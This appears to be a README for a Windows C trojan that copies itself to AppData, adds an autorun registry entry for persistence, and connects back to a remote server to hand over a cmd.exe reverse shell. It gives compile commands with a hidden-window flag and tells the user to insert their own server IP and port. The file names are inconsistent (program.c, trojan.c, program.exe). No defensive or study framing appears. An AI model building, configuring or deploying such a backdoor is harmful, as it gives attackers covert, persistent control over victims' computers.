# 💻 Program Description
# This C program creates a simple persistence mechanism and allows remote command execution by establishing a TCP connection to a server. The core functionality includes:

Persistence Setup 🔒:

The program copies itself to the AppData folder and creates an autorun registry entry to ensure it runs automatically whenever the system starts.

Remote Connection 🌐:

It attempts to establish a persistent connection to a remote server over TCP/IP.

The program continuously retries to connect to the server if the connection fails, with a 5-second retry interval.

Process Execution 🚀:

Once connected to the server, it redirects the standard input/output/error to the socket and spawns a cmd.exe process, which allows remote command execution.

Directory Manipulation 🧳:

Temporarily changes the current working directory to C: before launching the cmd.exe process, and then restores the original directory afterward.

⚙️ Installation & Compilation
To compile and run the program on a Windows system, follow these steps:

Install a C Compiler 🛠️:

Download and install MinGW (Minimalist GNU for Windows) or use Microsoft Visual Studio.

For MinGW, you can install it from here.

Prepare the Source Code 📑:

Copy the program's source code into a file, e.g., program.c.

Open Command Prompt 🖥️:

Navigate to the folder where trojan.c is located.

Compile the Code 🏗️:

If using MinGW, compile the program using the following command

gcc trojan.c -o trojan.exe -lws2_32 -mwindows -O2 -s

If using Visual Studio, open the project in Visual Studio and build the solution.

Run the Program 🚀:

Once compiled, you can run the program by simply executing the compiled program.exe from the command line or by double-clicking the executable.

🔧 Configuration
Before running the program, you'll need to modify the following parts of the code:

Set the Server IP Address 🌍:

In the server.sin_addr.s_addr = inet_addr("YOUR IP"); line, replace "YOUR IP" with the IP address of the remote server you want to connect to.

Set the Server Port 📡:

By default, the program connects to port 8850. You can change this port by modifying server.sin_port = htons(YOUR PORT); to any valid port number.
